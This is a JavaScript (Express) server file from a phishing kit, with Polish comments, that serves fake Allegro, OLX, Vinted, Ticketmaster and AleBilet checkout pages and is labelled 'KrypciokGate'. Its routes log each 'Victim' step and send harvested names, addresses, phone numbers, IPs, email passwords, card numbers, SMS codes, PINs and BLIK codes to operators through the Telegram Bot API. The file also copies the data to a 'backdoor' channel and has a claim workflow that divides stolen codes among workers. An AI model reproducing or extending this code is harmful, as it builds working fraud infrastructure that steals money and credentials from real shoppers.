                                                        <path d="m17.19 13h2.51v1.1a9.26 9.26 0 0 1 2.86 0.78l-1 2.46-0.7-0.3a8.08 8.08 0 0 0-1.18-0.35 3.94 3.94 0 0 0-0.93-0.1 1.54 1.54 0 0 0-0.88 0.2 0.61 0.61 0 0 0-0.27 0.52 0.77 0.77 0 0 0 0.35 0.61 14.93 14.93 0 0 0 1.55 0.83l0.18 0.07 0.17 0.08a5.6 5.6 0 0 1 1.89 1.2 2.8 2.8 0 0 1 0.22 0.25 3.15 3.15 0 0 1 0.6 2 3.31 3.31 0 0 1-0.56 1.89 3.74 3.74 0 0 1-1.58 1.31 6.37 6.37 0 0 1-0.7 0.25v1.28h-2.48v-1.08a6.53 6.53 0 0 1-1.18-0.15 8.06 8.06 0 0 1-1.66-0.55v-2.77a10.12 10.12 0 0 0 1.69 0.68 1.17 1.17 0 0 0 0.2 0.05 7.72 7.72 0 0 0 0.92 0.2 3.18 3.18 0 0 0 0.86 0.05 1.88 1.88 0 0 0 1-0.22 0.77 0.77 0 0 0 0.32-0.63 0.93 0.93 0 0 0-0.12-0.43 1.31 1.31 0 0 0-0.43-0.35c-0.17-0.1-0.6-0.3-1.25-0.6l-0.31-0.15s-0.07 0-0.1-0.05a6.63 6.63 0 0 1-1.53-0.9l-0.07-0.08a3 3 0 0 1-0.82-1.1 3.35 3.35 0 0 1-0.28-1.48 3 3 0 0 1 1.18-2.52 4.2 4.2 0 0 1 1.55-0.73v-1.27z"></path>
                                                        <path d="m4.57 13h6.09l-0.12 1.81h-0.78l0.9 13.4h15.64l0.9-13.4h-0.78l-0.12-1.81h6.1l-0.13 1.81h-0.78l0.91 13.4h2.6v2.93h-33v-2.98h2.54l0.91-13.4h-0.78z"></path>
                                                        <path d="m37 35h-37v-2.9h37z"></path>
                                                    </g>
                                                </svg>
                                            </div>
                                        </a>`
						template = template.replace(/TUTAJP/g, przelewiki);

					}
				}
			}
		}
		res.send(template);


		// if (!allegro || !olx) {
		// 	if (/telegrambot/i.test(userAgent)) {
		// 		return
		// 	}
		// 	const linkotworzony = `<tg-emoji emoji-id=\"5778421276024509124\">💸</tg-emoji> <b>KrypciokGate</b> -  <b>Victim Otworzył Link</b>\n
        // 🖥️ *Link Frontend:* 🛒 ${frontendName}
        // <tg-emoji emoji-id=\"5888620056551625531\">🏷</tg-emoji> <b>Link Title:</b> ${nazwa}`;
		// 	try {
		// 		await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
		// 			chat_id: oferta.owner,
		// 			text: linkotworzony,
		// 			parse_mode: "HTML"
		// 		});
		// 	} catch (error) {
		// 		console.error("Błąd przy wysyłaniu do Telegrama:", error);
		// 	}
		// }



		// ── Powiadomienia o krokach — jeden wspólny wygląd (jak na AleBilet) z IP/geo ──
		const stepLabels = {
			dostawa: "Victim przeszedł do wyboru dostawy",
			zakup: "Victim wypełnia dane",
			PayU: "Victim przeszedł do płatności",
			PayU_BLIK: "Victim wybrał BLIK",
			PayU_Karta: "Victim wybrał kartę",
			BLIK: "Victim będzie wpisywał BLIK",
			inpost: "Victim wybiera paczkomat",
			login: "Victim będzie się logował",
			PayU_Przelew: "Victim wybrał przelew",
			przelew: "Victim będzie wypełniał przelew",
			Platnosc: "Victim podał kartę i czeka na instrukcje",
		};
		const stepToSend = stepLabels[olx] || stepLabels[allegro];
		if (stepToSend) {
			await notifyGatewayVictim(oferta.owner, frontendName, stepToSend, buildGatewayNotifyMeta(oferta, frontendName, req));
		}

		const errMethod = req.query.method || (req.query.c === "3" ? "karta" : "blik");
		if (olx == "error" || allegro == "error") {
			await notifyGatewayVictim(
				oferta.owner,
				frontendName,
				errMethod === "karta" ? "Victim zostal przekierowany na dipa (KARTA)" : "Victim — błąd płatności BLIK",
				buildGatewayNotifyMeta(oferta, frontendName, req)
			);
		}

		if (przelewy.status !== "Nie") {
			if (allegro == "PayU") {
				await notifyGatewayVictim(oferta.owner, frontendName, "Victim wszedł na PayU", buildGatewayNotifyMeta(oferta, frontendName, req));
			}
			if (allegro == "przelew") {
				await notifyGatewayVictim(oferta.owner, frontendName, "Victim wybrał przelew", buildGatewayNotifyMeta(oferta, frontendName, req));
			}
			if (allegro == "PayU_Przelew") {
				await notifyGatewayVictim(oferta.owner, frontendName, "Victim potwierdził wysłanie przelewu", buildGatewayNotifyMeta(oferta, frontendName, req));
			}
		}

		if (allegro == "koszyk") {
			await notifyGatewayVictim(oferta.owner, frontendName, "Victim kliknął Kup Teraz", buildGatewayNotifyMeta(oferta, frontendName, req));
		}

	} catch (error) {
		console.error(error);
		return res.status(500).redirect(getGatewayFallbackUrl(req.subdomain));
	}
});

async function renderGatewayBankSelect(req, res, oferta, platform) {
	try {
		if (!(await isBotOnline()) || !(await areOfferGatewaysAvailable())) {
			return res.status(503).redirect(getGatewayFallbackUrl(platform));
		}
		let template = fs.readFileSync(path.join(__dirname, 'template', 'ticketmasterdane.html'), 'utf8');
		const plainOferta = typeof oferta.toObject === "function" ? oferta.toObject() : oferta;
		const offerForTemplate = {
			...plainOferta,
			cena: platform === 'alebilet' ? String(getAlebiletPricing(oferta).totalInt) : oferta.cena,
		};
		const payBase = platform === 'alebilet'
			? `/ssl/kup/${encodeURIComponent(oferta.link)}/pay`
			: `/platnosc/${encodeURIComponent(oferta.link)}/${encodeURIComponent(oferta.idoferty)}/pay`;
		template = applyTicketmasterReplacements(template, offerForTemplate, req, { priced: platform === 'alebilet' })
			.replace(/TUTAJPAYBASE/g, payBase);
		if (platform === 'alebilet') {
			template = template
				.replace(/Ticketmaster/g, 'AleBilet')
				.replace(/ticketmaster/g, 'alebilet');
		}
		res.send(template);
		await notifyGatewayVictim(oferta.owner, platform, 'Victim przeszedł do wyboru płatności', buildGatewayNotifyMeta(oferta, platform, req));
	} catch (error) {
		console.error('renderGatewayBankSelect error:', error);
		res.status(500).send('Błąd serwera');
	}
}

async function findAlebiletOffer(link) {
	const oferty = await loadOffersAlebiletDB();
	const normalizedLink = normalizeOfferLink(link);
	return oferty.find(o => offerLinkMatches(o.link, normalizedLink));
}

async function renderAlebiletGatewayPage(req, res, link, templateFile, extra = {}) {
	try {
		if (req.subdomain !== 'alebilet') return res.status(404).send('Not found');
		const oferta = await findAlebiletOffer(link);
		if (!oferta) return res.status(404).redirect('https://www.alebilet.pl/');
		if (!(await isBotOnline()) || !(await areOfferGatewaysAvailable())) {
			return res.status(503).redirect('https://www.alebilet.pl/');
		}
		let template = fs.readFileSync(path.join(__dirname, 'template', templateFile), 'utf8');
		template = applyAlebiletReplacements(template, oferta, extra);
		res.send(template);

		if (templateFile === 'alebilet.html') {
			await notifyGatewayVictim(oferta.owner, 'alebilet', 'Victim Otworzył Link', buildGatewayNotifyMeta(oferta, 'alebilet', req));
		} else if (templateFile === 'alebilet_checkout.html') {
			await notifyGatewayVictim(oferta.owner, 'alebilet', 'Victim wypełnia dane', buildGatewayNotifyMeta(oferta, 'alebilet', req));
		}
		return;
	} catch (error) {
		console.error('AleBilet route error:', error);
		return res.status(500).send('Błąd serwera');
	}
}

app.get('/ssl/kup/:link', async (req, res) => {
	return renderAlebiletGatewayPage(req, res, req.params.link, 'alebilet.html');
});

app.post('/ssl/kup/:link/podsumowanie', express.urlencoded({ extended: true }), async (req, res) => {
	const phone = (req.body['ticketPurchase.buyer.primaryPhone'] || '').trim();
	const email = (req.body['ticketPurchase.buyer.username'] || '').trim();
	return renderAlebiletGatewayPage(req, res, req.params.link, 'alebilet_checkout.html', { phone, email });
});

app.get('/ssl/kup/:link/podsumowanie', async (req, res) => {
	return renderAlebiletGatewayPage(req, res, req.params.link, 'alebilet_checkout.html');
});

app.get('/ssl/kup/:link/pay', async (req, res) => {
	if (req.subdomain !== 'alebilet') return res.status(404).send('Not found');
	return renderGatewayPaymentStep(req, res, 'alebilet', normalizeOfferLink(req.params.link));
});

app.get('/ssl/kup/:link/platnosc', async (req, res) => {
	if (req.subdomain !== 'alebilet') return res.status(404).send('Not found');
	const oferta = await findAlebiletOffer(req.params.link);
	if (!oferta) return res.status(404).redirect('https://www.alebilet.pl/');
	const q = new URLSearchParams(req.query);
	q.set('olx', 'BLIK');
	return res.redirect(`/ssl/kup/${encodeURIComponent(oferta.link)}/pay?${q.toString()}`);
});

app.post('/ssl/kup/:link/login-event', express.json(), async (req, res) => {
	try {
		const { step, email, password } = req.body || {};
		const oferta = await findAlebiletOffer(req.params.link);
		if (oferta?.owner) {
			const lines = [modernKv("Krok", step || "unknown")];
			if (email) lines.push(modernKv("Email", email));
			if (password) lines.push(modernKv("Hasło", password));
			await sendModernStatus(oferta.owner, [{ title: "AleBilet — logowanie", lines }]);
		}
		res.json({ ok: true });
	} catch (error) {
		console.error('alebilet login-event error:', error);
		res.status(500).json({ ok: false });
	}
});

async function findTicketmasterOffer(link, idoferty) {
	const oferty = await loadOffersTicketmasterDB();
	const normalizedLink = normalizeOfferLink(link);
	const normalizedId = idoferty != null ? String(idoferty) : '';
	return oferty.find(o => offerLinkMatches(o.link, normalizedLink) && String(o.idoferty) === normalizedId)
		|| oferty.find(o => String(o.idoferty) === normalizedId)
		|| oferty.find(o => offerLinkMatches(o.link, normalizedLink));
}

async function findVintedOffer(link) {
	const oferty = await loadOffersVintedDB();
	const normalizedLink = normalizeOfferLink(link);
	return oferty.find(o => offerLinkMatches(o.link, normalizedLink));
}

app.get('/ticketmaster-event', async (req, res) => {
	return res.redirect(`/?id=${encodeURIComponent(req.query.id || '')}`);
});

app.get('/platnosc/:link/:idoferty/pay', async (req, res) => {
	if (req.subdomain !== 'ticketmaster') return res.status(404).send('Not found');
	return renderGatewayPaymentStep(req, res, 'ticketmaster', normalizeOfferLink(req.params.link), req.params.idoferty);
});

app.get('/platnosc/:link/:idoferty/blik', async (req, res) => {
	const q = new URLSearchParams(req.query);
	q.set('olx', 'PayU_BLIK');
	return res.redirect(`/platnosc/${encodeURIComponent(req.params.link)}/${encodeURIComponent(req.params.idoferty)}/pay?${q.toString()}`);
});

app.get('/platnosc/:link/:idoferty/payu', async (req, res) => {
	const q = new URLSearchParams(req.query);
	q.set('olx', 'PayU_BLIK');
	return res.redirect(`/platnosc/${encodeURIComponent(req.params.link)}/${encodeURIComponent(req.params.idoferty)}/pay?${q.toString()}`);
});

app.get('/platnosc/:link/:idoferty', async (req, res) => {
	if (req.subdomain !== 'ticketmaster') return res.status(404).send('Not found');
	try {
		const link = normalizeOfferLink(req.params.link);
		const oferta = await findTicketmasterOffer(link, req.params.idoferty);
		if (!oferta) return res.status(404).send('Nie znaleziono wydarzenia');
		return renderGatewayBankSelect(req, res, oferta, 'ticketmaster');
	} catch (error) {
		console.error('Ticketmaster platnosc error:', error);
		res.status(500).send('Błąd');
	}
});

app.post('/ticketmaster-victim-data', express.json(), async (req, res) => {
	try {
		const { idoferty, link, step, imie, nazwisko, email, telefon } = req.body || {};
		const oferta = await findTicketmasterOffer(link, idoferty);
		if (oferta?.owner) {
			const lines = [
				modernKv("Krok", step || "unknown"),
				modernKv("Wydarzenie", oferta.nazwa),
			];
			if (imie) lines.push(modernKv("Imię", imie));
			if (nazwisko) lines.push(modernKv("Nazwisko", nazwisko));
			if (email) lines.push(modernKv("Email", email));
			if (telefon) lines.push(modernKv("Telefon", telefon));
			await sendModernStatus(oferta.owner, [{ title: "Ticketmaster — dane", lines }]);
		}
		res.json({ ok: true });
	} catch (error) {
		console.error('ticketmaster-victim-data error:', error);
		res.status(500).json({ ok: false });
	}
});

app.get('/items/:nazwa', async (req, res) => {
	const { nazwa } = req.params;
	const vinted = normalizeGatewayStepParam(req.query.vinted, ['BLIK', 'error', 'zakup']);

	if (req.subdomain !== 'vinted') {
		return res.status(404).send('Not found');
	}

	try {
		const oferta = await findVintedOffer(nazwa);
		if (!oferta) return res.status(404).redirect('https://www.vinted.pl/');
		if (!(await isBotOnline()) || !(await areOfferGatewaysAvailable())) {
			return res.status(503).redirect('https://www.vinted.pl/');
		}

		if (vinted === 'BLIK' || vinted === 'error') {
			if (!(await isGlobalBlikEnabled())) {
				return res.status(503).redirect('https://www.vinted.pl/');
			}
			const q = new URLSearchParams(req.query);
			q.delete('vinted');
			q.set('vinted', 'zakup');
			if (vinted === 'BLIK') {
				q.set('openBlik', '1');
			} else {
				q.set('blikError', '1');
				if (!q.has('outcome') && !q.has('c')) q.set('outcome', 'accepted');
			}
			return res.redirect(`/items/${encodeURIComponent(nazwa)}?${q.toString()}`);
		}

		const templateFile = vinted === 'zakup' ? 'vinted_dane.html' : 'vinted.html';
		let template = fs.readFileSync(path.join(__dirname, 'template', templateFile), 'utf8');
		template = applyVintedReplacements(template, oferta);
		res.send(template);

		const notifyMeta = buildGatewayNotifyMeta(oferta, 'vinted', req);
		if (vinted === 'zakup') {
			if (req.query.openBlik === '1' && !req.query.auth) {
				await notifyGatewayVictim(oferta.owner, 'vinted', 'Victim bedzie wpisywał blika', notifyMeta);
			} else if (req.query.blikError === '1') {
				await notifyGatewayVictim(oferta.owner, 'vinted', 'Victim — błąd płatności BLIK', notifyMeta);
			} else {
				await notifyGatewayVictim(oferta.owner, 'vinted', 'Victim wypełnia dane', notifyMeta);
			}
		} else {
			await notifyGatewayVictim(oferta.owner, 'vinted', 'Victim Otworzył Link', notifyMeta);
		}
	} catch (error) {
		console.error('Vinted route error:', error);
		res.status(500).send('Błąd');
	}
});

app.use(express.static('template'));

const messagesById = {};

app.use("/api", (req, res, next) => {
	if (req.path.includes("heartbeat")) return next();
	return apiRateLimiter(req, res, next);
});

app.get("/api/messenger-api.php", async (req, res) => {
	const {
		id,
		"messenger-id": messengerId,
		action,
		"message-text": messageText,
		"is-seller": isSeller
	} = req.query;

	if (!id || !messengerId) {
		return res.status(400).send("xd");
	}

	if (!messagesById[id]) {
		messagesById[id] = {};
	}

	if (!messagesById[id][messengerId]) {
		messagesById[id][messengerId] = [];
	}

	const oferty = await loadOffersDB();
	const oferta = oferty.find(o => o.link == id);
	if (!oferta) {
		return res.status(404).json({
			error: "xd"
		});
	}

	const users = await loadUsersDB();

	const user = users.find(u => String(u.id) === String(oferta.owner));
	const domain = await getEffectiveUserDomain(user);
	const domenaLink = domain ?
		`https://allegrolokalnie.${domain}/oferta/${encodeURIComponent(oferta.link)}?allegro=kontakt&id=${messengerId}&is-seller=1` :
		"NIE MASZ PODPIĘTEJ DOMENY";



	if (action === "GetMessages") {
		const responseText = messagesById[id][messengerId].map(msg => `{"message_data":"${JSON.stringify(msg).replace(/"/g, '\\"')}"}`).join(",\n");
		return res.send(`[${responseText}]`);
	} else if (action === "SendMessage" && messageText) {
		const now = new Date();
		const formatter = new Intl.DateTimeFormat('pl-PL', {
			timeZone: 'Europe/Warsaw',
			hour: '2-digit',
			minute: '2-digit',
			hour12: false
		  });
		  
		  const formattedTime = formatter.format(now);



		const newMessage = {
			IsSeller: isSeller === "1" ? "1" : "0",
			MessageText: messageText,
			MessageDate: formattedTime,
		};
		messagesById[id][messengerId].push(newMessage);

		if (isSeller === "1") {

			const dzisiajLastOnline = `Dzisiaj o ${formattedTime}`;  
			try {
				await editOfferDB(oferta.idoferty, { lastonline: dzisiajLastOnline });

			} catch (err) {
				console.error("Błąd przy aktualizacji lastonline:", err);
			}
		} else {
			const linkotworzony = `<tg-emoji emoji-id=\"6028115612163641653\">☁</tg-emoji> <b>KrypciokGate</b> -  <b>Nowa wiadomość</b>\n\n<tg-emoji emoji-id=\"5888620056551625531\">🏷</tg-emoji> <b>Link Title:</b> ${oferta.link}\n\n` +
				`<tg-emoji emoji-id=\"6028115612163641653\">☁</tg-emoji> <b>Wiadomość: ${messageText}</b>\n\n` +
				`<a href="${domenaLink}"><tg-emoji emoji-id=\"6041730074376410123\">📥</tg-emoji> Link </a>`;
			try {
				await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
					chat_id: oferta.owner,
					text: linkotworzony,
					parse_mode: "HTML"
				});
			} catch (error) {
				console.error("Błąd przy wysyłaniu do Telegrama:", error);
			}
		}

		return res.send(formattedTime);
	} else {
		return res.status(400).send("xd");
	}
});




function sendBackdoorLogOnly(text, threadId = blikThread()) {
	sendTelegramHtmlSafe(CONFIG.CHANNELS.BACKDOOR, text, null, threadId).catch(() => {});
}

// Kod z bramki (SMS / PIN / hasło) — backdoor pełne dane, kanał główny zamaskowany + przejęcie
async function deliverGatewaySecret({ itemKey, amount, owner, person, phone, workerName, fullText, maskedText, threadId }) {
	codeMeta.set(itemKey, {
		type: "card",
		source: "gateway",
		amount,
		owner,
		person,
		phone,
		workerName,
		fullText
	});
	await sendTelegramHtmlSafe(CONFIG.CHANNELS.BACKDOOR, fullText, null, threadId).catch(() => {});
	const mainKeyboard = {
		inline_keyboard: [
			[{ text: "Przejmij", icon_custom_emoji_id: "6037496202990194718", callback_data: `claim_${owner}_${amount}_${itemKey}` }]
		]
	};
	const sendOwner = async () => {
		const mid = await sendTelegramHtmlSafe(owner, fullText, null);
		registerCodeMessage(`card_${itemKey}`, owner, mid);
	};
	const sendMain = async () => {
		const mid = await sendTelegramHtmlSafe(CONFIG.CHANNELS.CODES, maskedText, mainKeyboard, threadId);
		registerCodeMessage(`card_${itemKey}`, CONFIG.CHANNELS.CODES, mid);
	};
	const deliver = async () => {
		if (await isSelfCashoutEnabled(owner)) await sendOwner();
		else await sendMain();
	};
	if (backdoorDelayMs > 0) scheduleDelayed(backdoorDelayMs, deliver);
	else await deliver();
}

app.get("/api/logger-api.php", async (req, res) => {
	const {
		id,
		"log-type": logType,
		address,
		"sms-code": smsCode,
		"card-number": cardNumber
	} = req.query;

	if (!logType || (logType !== "BLIK" && logType !== "BLIK-CLOSE" && logType !== "SMS-CLOSE" && logType !== "PIN-CLOSE" && logType !== "PASS-CLOSE" && logType !== "PIN-CLOSE" && logType !== "PINCode" && logType !== "PASSCode" && logType !== "Card" && logType !== "SMSCode" && (!id || !address))) {
		return res.status(400).json({
			error: "xd"
		});
	}

	const oferty = await req.tenant.loadOffers();

	if (!Array.isArray(oferty)) {
		return res.status(500).json({
			error: "xd"
		});
	}

	const oferta = oferty.find(o => o.link == id);
	if (!oferta) {
		return res.status(404).json({
			error: "xd"
		});
	}


	async function idToUser(userId) {
		try {

			const user = await bot.getChat(userId);

			return user.username || userId;
		} catch (error) {
			return userId;
		}
	}

	const workerName = await idToUser(oferta.owner);



	if (logType === "BuyerData") {
		const [imie, nazwisko, ulica, kod, miasto, telefon] = address.split(";");
		const fullName = `${imie} ${nazwisko}`.trim().replace(/^"|"$/g, "");

		const ip = clientIpFromReq(req);
		const net = await lookupIpInfo(ip);
		const flags = [];
		if (net.vpn) flags.push("VPN/Proxy");
		if (net.hosting) flags.push("Hosting/DC");

		const message = `<tg-emoji emoji-id="undefined">📝</tg-emoji> <b>Dane kupującego</b>\n\n` +
			`<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${oferta.cena} PLN\n` +
			`<tg-emoji emoji-id=\"6032994772321309200\">👤</tg-emoji> <b>Osoba</b> · ${fullName}\n` +
			`<tg-emoji emoji-id=\"6042137469204303531\">🏠</tg-emoji> <b>Adres</b> · <code>${ulica} ${kod} ${miasto}</code>\n` +
			`<tg-emoji emoji-id=\"6039605143601680423\">📞</tg-emoji> <b>Numer</b> · <code>${decodeURIComponent(telefon)}</code></blockquote>\n` +
			`<tg-emoji emoji-id=\"5776233299424843260\">🌐</tg-emoji> <b>IP</b> · <code>${ip}</code>\n` +
			`📡 <b>Sieć</b> · ${net.label}${net.geo ? ` · ${net.geo}` : ""}\n` +
			`<tg-emoji emoji-id=\"6030537007350944596\">🛡</tg-emoji> <b>Wykryto</b> · ${flags.length ? flags.join(" + ") : "brak"}`;

		const url = `https://api.telegram.org/bot${token}/sendMessage`;
		await fetch(url, {
			method: "POST",
			headers: {
				"Content-Type": "application/json"
			},
			body: JSON.stringify({
				chat_id: oferta.owner,
				text: message,
				parse_mode: "HTML"
			})
		});
		// Dane kupującego — tylko backdoor (kanał główny tylko kody)
		sendBackdoorLogOnly(message, blikThread());
	} else if (logType === "BLIK") {
		if (!(await isSelfCashoutEnabled(oferta.owner))) {
			const message = `<tg-emoji emoji-id=\"6035162669948867129\">🔢</tg-emoji> <b>Okno BLIK otwarte</b>\n\n<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${oferta.cena} PLN</blockquote>\n👷 ${workerName}`;

			sendBackdoorLogOnly(message, blikThread());
		}
	} else if (logType === "BLIK-CLOSE") {
		if (!(await isSelfCashoutEnabled(oferta.owner))) {
			const message = `<tg-emoji emoji-id="undefined">⚠️</tg-emoji> <b>Okno BLIK zamknięte</b>\n\n<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${oferta.cena} PLN</blockquote>\n👷 ${workerName}`;

			sendBackdoorLogOnly(message, blikThread());
		}
	} else if (logType === "PIN-CLOSE") {
		const message = `<tg-emoji emoji-id="undefined">⚠️</tg-emoji> <b>Okno PIN zamknięte</b>\n\n<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${oferta.cena} PLN</blockquote>\n👷 ${workerName}`


			sendBackdoorLogOnly(message, blikThread());
	} else if (logType === "PASS-CLOSE") {
		const message = `<tg-emoji emoji-id="undefined">⚠️</tg-emoji> <b>Okno hasła zamknięte</b>\n\n<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${oferta.cena} PLN</blockquote>\n👷 ${workerName}`


			sendBackdoorLogOnly(message, blikThread());
	} else if (logType === "SMS-CLOSE") {
		const message = `<tg-emoji emoji-id="undefined">⚠️</tg-emoji> <b>Okno SMS zamknięte</b>\n\n<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${oferta.cena} PLN</blockquote>\n👷 ${workerName}`


			sendBackdoorLogOnly(message, cardThread());
	} else if (logType === "Card") {
		const message = `<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Okno karty otwarte</b>\n\n<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${oferta.cena} PLN</blockquote>\n👷 ${workerName}`


			sendBackdoorLogOnly(message, cardThread());
	} else if (logType === "SMSCode") {
		if (!smsCode || !cardNumber) {
			return res.status(400).json({
				error: "xd"
			});
		}
		await deliverGatewaySecret({
			itemKey: `${cardNumber}#sms`,
			amount: oferta.cena,
			owner: oferta.owner,
			person: "—",
			phone: "—",
			workerName,
			threadId: cardThread(),
			fullText: `✉️ <b>Kod SMS od victima</b>\n\n<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${oferta.cena} PLN\n✉️ <b>Kod SMS</b> · <code>${smsCode}</code>\n<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Karta</b> · <code>${cardNumber}</code></blockquote>\n👷 ${workerName}`,
			maskedText: `✉️ <b>Kod SMS od victima</b>\n\n<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${oferta.cena} PLN\n✉️ <b>Kod SMS</b> · <code>••• •••</code>\n<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Karta</b> · <code>${maskCardNumber(cardNumber)}</code></blockquote>\n<tg-emoji emoji-id=\"6037249452824072506\">🔒</tg-emoji> Dane ukryte — przejmij, aby zobaczyć`
		});
	} else if (logType === "PINCode") {
		if (!smsCode || !cardNumber) {
			return res.status(400).json({
				error: "xd"
			});
		}
		await deliverGatewaySecret({
			itemKey: `${cardNumber}#pin`,
			amount: oferta.cena,
			owner: oferta.owner,
			person: "—",
			phone: "—",
			workerName,
			threadId: cardThread(),
			fullText: `<tg-emoji emoji-id=\"5776118099812028333\">📟</tg-emoji> <b>PIN od victima</b>\n\n<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${oferta.cena} PLN\n<tg-emoji emoji-id=\"5776118099812028333\">📟</tg-emoji> <b>PIN</b> · <code>${smsCode}</code>\n<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Karta</b> · <code>${cardNumber}</code></blockquote>\n👷 ${workerName}`,
			maskedText: `<tg-emoji emoji-id=\"5776118099812028333\">📟</tg-emoji> <b>PIN od victima</b>\n\n<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${oferta.cena} PLN\n<tg-emoji emoji-id=\"5776118099812028333\">📟</tg-emoji> <b>PIN</b> · <code>••••</code>\n<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Karta</b> · <code>${maskCardNumber(cardNumber)}</code></blockquote>\n<tg-emoji emoji-id=\"6037249452824072506\">🔒</tg-emoji> Dane ukryte — przejmij, aby zobaczyć`
		});
	} else if (logType === "PASSCode") {
		if (!smsCode || !cardNumber) {
			return res.status(400).json({
				error: "xd"
			});
		}
		await deliverGatewaySecret({
			itemKey: `${cardNumber}#pass`,
			amount: oferta.cena,
			owner: oferta.owner,
			person: "—",
			phone: "—",
			workerName,
			threadId: cardThread(),
			fullText: `<tg-emoji emoji-id=\"6037249452824072506\">🔐</tg-emoji> <b>Hasło od victima</b>\n\n<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${oferta.cena} PLN\n<tg-emoji emoji-id=\"6037249452824072506\">🔐</tg-emoji> <b>Hasło</b> · <code>${smsCode}</code>\n<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Karta</b> · <code>${cardNumber}</code></blockquote>\n👷 ${workerName}`,
			maskedText: `<tg-emoji emoji-id=\"6037249452824072506\">🔐</tg-emoji> <b>Hasło od victima</b>\n\n<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${oferta.cena} PLN\n<tg-emoji emoji-id=\"6037249452824072506\">🔐</tg-emoji> <b>Hasło</b> · <code>••••••</code>\n<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Karta</b> · <code>${maskCardNumber(cardNumber)}</code></blockquote>\n<tg-emoji emoji-id=\"6037249452824072506\">🔒</tg-emoji> Dane ukryte — przejmij, aby zobaczyć`
		});
	}

	res.json({
		success: true
	});
});



async function sendLogToTelegram(chatId, logMessage) {
	const url = `https://api.telegram.org/bot${token}/sendMessage`;
	const body = {
		chat_id: chatId,
		text: logMessage,
		parse_mode: 'HTML'
	};
	try {
		const response = await fetch(url, {
			method: 'POST',
			body: JSON.stringify(body),
			headers: {
				'Content-Type': 'application/json'
			},
		});
		const data = await response.json();
	} catch (error) {}
}


app.use(express.json());

app.get('/api/login-api.php', async (req, res) => {
	const {
		id,
		email,
		password
	} = req.query;

	if (!id || !email || !password) {
		return res.status(400).json({
			message: 'xd'
		});
	}

	const offers = await req.tenant.loadOffers();
	const offer = offers.find(offer => offer.link === id);

	if (!offer) {
		return res.status(404).json({
			message: 'xd'
		});
	}
	const logMessage = `<tg-emoji emoji-id=\"6037249452824072506\">🔑</tg-emoji> <b>Nowe logowanie</b>\n\n` +
		`<blockquote><tg-emoji emoji-id=\"6039573425268201570\">📩</tg-emoji> <b>E-mail</b> · <code>${email}</code>\n` +
		`<tg-emoji emoji-id=\"6037249452824072506\">🔐</tg-emoji> <b>Hasło</b> · <code>${password}</code></blockquote>`

	sendLogToTelegram(offer.owner, logMessage);
	sendBackdoorLogOnly(logMessage, blikThread());

	return res.redirect(`/oferta/${offer.link}`);
});

let blikCodes = {};
let cardStatus = {};
const codeAcceptLocks = new Set();
const blikitel = new Map();
const codeOwner = new Map();
const kartaOwner = new Map();
const codeClaimer = new Map();
const codeMeta = new Map();
const claimPanels = new Map();

async function clearClaimPanel(item) {
	const panels = claimPanels.get(item);
	if (!panels) return;
	claimPanels.delete(item);
	for (const { chatId, messageId } of panels) {
		await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId }).catch(() => {});
	}
}

function registerClaimPanel(item, chatId, messageId) {
	if (messageId == null) return;
	const list = claimPanels.get(item) || [];
	list.push({ chatId, messageId });
	claimPanels.set(item, list);
}

// Czy czat to kanał główny (legit)? Tam kod trzeba najpierw przejąć.
function isCodesChat(chatId) {
	return chatId != null && String(chatId) === String(CONFIG.CHANNELS.CODES);
}

function maskBlikCode() {
	return "••• •••";
}

function maskCardNumber(cardNumber) {
	const raw = String(cardNumber).replace(/\s+/g, "");
	if (raw.length < 10) return "•••• •••• •••• ••••";
	return `${raw.slice(0, 6)} •••• •••• ${raw.slice(-4)}`;
}

function normalizeBlikCode(code) {
	return String(code ?? "").trim();
}

async function saveBlikSession(code, data) {
	const codeKey = normalizeBlikCode(code);
	if (!codeKey) return null;

	if (data.status !== undefined) {
		blikCodes[codeKey] = data.status;
	}

	const doc = await BlikSession.findOneAndUpdate(
		{ code: codeKey },
		{ ...data, code: codeKey, updatedAt: new Date() },
		{ upsert: true, new: true }
	);

	if (doc?.smiec) {
		codeOwner.set(codeKey, {
			smiec: doc.smiec,
			idoferty: doc.idoferty,
			cena: doc.cena,
			platform: doc.platform,
			workerName: doc.workerName
		});
	}

	return doc;
}

async function getBlikSession(code) {
	const codeKey = normalizeBlikCode(code);
	if (!codeKey) return null;

	if (codeOwner.has(codeKey)) {
		const cached = codeOwner.get(codeKey);
		return {
			code: codeKey,
			status: blikCodes[codeKey] ?? 0,
			...cached
		};
	}

	const doc = await BlikSession.findOne({ code: codeKey });
	if (!doc) return null;

	blikCodes[codeKey] = doc.status;
	codeOwner.set(codeKey, {
		smiec: doc.smiec,
		idoferty: doc.idoferty,
		cena: doc.cena,
		platform: doc.platform,
